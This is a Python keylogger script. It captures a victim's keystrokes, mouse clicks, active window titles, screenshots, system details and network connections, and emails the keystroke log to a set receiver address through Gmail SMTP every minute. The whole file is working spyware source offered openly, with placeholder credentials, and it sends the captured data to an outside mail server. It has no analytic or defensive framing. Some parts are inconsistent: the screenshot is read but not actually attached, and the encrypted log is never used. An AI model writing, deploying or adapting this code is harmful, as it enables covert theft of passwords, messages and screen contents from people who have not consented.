import smtplib
import pygetwindow as gw
import ssl
from pynput.keyboard import Key, Listener
import logging
from threading import Timer
import platform
import psutil
import os
from datetime import datetime
from PIL import ImageGrab
from cryptography.fernet import Fernet
from pynput.mouse import Listener as MouseListener

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.FileHandler("keylogger.log"),
    logging.StreamHandler()
])

# Global variables
keystrokes = ""

# Directories
log_file = "key_log.txt"
screenshot_folder = "screenshots"
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Email credentials and configuration
EMAIL_ADDRESS = "Yourgmail7@gmail.com" 
EMAIL_PASSWORD = "password"
RECEIVER_EMAIL = "Recivergmail@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465  # SSL port for Gmail

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Capture network activity
def capture_network_activity():
    connections = psutil.net_connections()
    for conn in connections:
        logging.info(f"Connection from {conn.laddr} to {conn.raddr} (status: {conn.status})")

# Capture system information
def capture_system_info():
    system_info = {
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Processor": platform.processor(),
        "CPU Usage": f"{psutil.cpu_percent()}%",
        "Memory": f"{psutil.virtual_memory().percent}%"
    }
    logging.info(f"System Information: {system_info}")

# Mouse click event listener
def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f"Mouse clicked at ({x}, {y}) with {button}")

# Start mouse listener in a separate thread
mouse_listener = MouseListener(on_click=on_click)
mouse_listener.start()

# Encrypt logs
def encrypt_logs():
    global keystrokes
    encrypted_keystrokes = cipher.encrypt(keystrokes.encode())
    return encrypted_keystrokes

# Get active window title
def get_active_window():
    active_window = gw.getActiveWindow()
    if active_window:
        return active_window.title
    return "Unknown"

# Capture keystrokes
def on_press(key):
    global keystrokes
    try:
        keystrokes += str(key.char)
    except AttributeError:
        if key == Key.space:
            keystrokes += ' '  # Replace space with an actual space
        else:
            keystrokes += ' ' + str(key) + ' '  # Add special keys like shift, ctrl

# Stop logging on 'esc' key release
def on_release(key):
    if key == Key.esc:
        return False

# Take a screenshot
def take_screenshot(region=None):
    screenshot_file = os.path.join(screenshot_folder, f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
    try:
        screenshot = ImageGrab.grab(bbox=region)  # Capture specified region or full screen
        screenshot.save(screenshot_file)
        logging.info(f"Screenshot saved as {screenshot_file}")
    except Exception as e:
        logging.error(f"Error taking screenshot: {e}")
    return screenshot_file

# Send email with log data and screenshots
def send_email():
    global keystrokes
    encrypted_keystrokes = encrypt_logs()

    with open(log_file, "w") as f:
        f.write(keystrokes)

    # Prepare email content
    message = f"Subject: Keylogger Report\n\nKeystrokes:\n{keystrokes}"

    # Take a screenshot
    screenshot_file = take_screenshot()

    # Send email
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            # Create email message
            msg = f"Subject: Keylogger Report\n\nKeystrokes:\n{keystrokes}\nScreenshot attached."

            # Read screenshot file
            with open(screenshot_file, 'rb') as f:
                image_data = f.read()

            # Construct the email message with screenshot
            email_message = f"From: {EMAIL_ADDRESS}\nTo: {RECEIVER_EMAIL}\nSubject: Keylogger Report\n\n{msg}"

            # Sending email with screenshot as attachment
            server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, email_message)
            logging.info(f"Email with logs and screenshot sent to {RECEIVER_EMAIL}")

    except Exception as e:
        logging.error(f"Error sending email: {e}")


# Timed function to send logs and screenshots via email every minute
def send_logs_interval(interval=60):
    send_email()  # Send log and screenshot via email
    Timer(interval * 60, send_logs_interval, [interval]).start()  # Schedule next email

# Start keylogging and email reporting
def start_keylogger():
    logging.info("Keylogger started")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        send_logs_interval(1)  # Send logs every minute (adjust interval as needed)
        listener.join()

if __name__ == "__main__":
    start_keylogger()
    
    